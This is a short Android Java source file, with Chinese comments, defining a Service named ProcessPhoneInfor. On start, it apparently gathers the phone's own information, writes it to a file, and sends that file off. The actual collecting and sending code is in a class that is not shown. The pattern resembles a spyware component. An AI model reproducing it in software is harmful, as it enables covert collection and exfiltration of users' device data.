package Boomerang_android15.com;


/*
 * 类功能：Service的一个子类，启动获取手机信息的功能
 * 
 * */

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ProcessPhoneInfor extends Service
{	
	
	private OperatePhoneInfor m_phoneInfor = null ;
	
    //配置信息相关
    //private SetInformation m_settingInfor;    //配置文件的设置信息
    //private String m_configFilePath;  //配置文件的路径

	public void onCreate()
	{
		Log.i("333+++", "ProcessPhoneInfor onCreate: begin ");
		super.onCreate();
		
		System.setProperty("file.encoding", "GBK"); //设置编码方式
		
	}
	 
	public void onStart (Intent intent, int startId )
	{
		super.onStart(intent, startId);
		Log.i("333+++", "ProcessPhoneInfor onStart: begin ");	
		initialize();
		StartPhoneInfor();
	}

	public IBinder onBind(Intent intent)
	{

		return null;
	}

	
	public void onDestory()
	{
		super.onDestroy();
	}

	
    private void initialize()
    {
       	//1.获得配置文件路径
        Log.i("333+++", "ProcessPhoneInfor initialize: begin!");
        //m_configFilePath = this.getFilesDir()+ java.io.File.separator + this.getString(R.string.config_file);
   
        //2.读取配置文件信息
       // m_settingInfor = new  SetInformation(m_configFilePath);     
        //m_settingInfor.ReadConfigFile();
    	
        //创建处理电话薄的对象
        m_phoneInfor = new OperatePhoneInfor(this);
    	
    }
	
    private void StartPhoneInfor()
    {   
    	Log.i("333+++", "ProcessPhoneInfor Start: begin ");
        //从手机中读取自身信息,并保存到文件中
    	m_phoneInfor.GetPhoneInfor();
    	m_phoneInfor.WritePhoneInfor();
    	
        //将保存手机自身信息的文件发送
    	m_phoneInfor.SendPhoneInfor();
         
       }
	
	
}
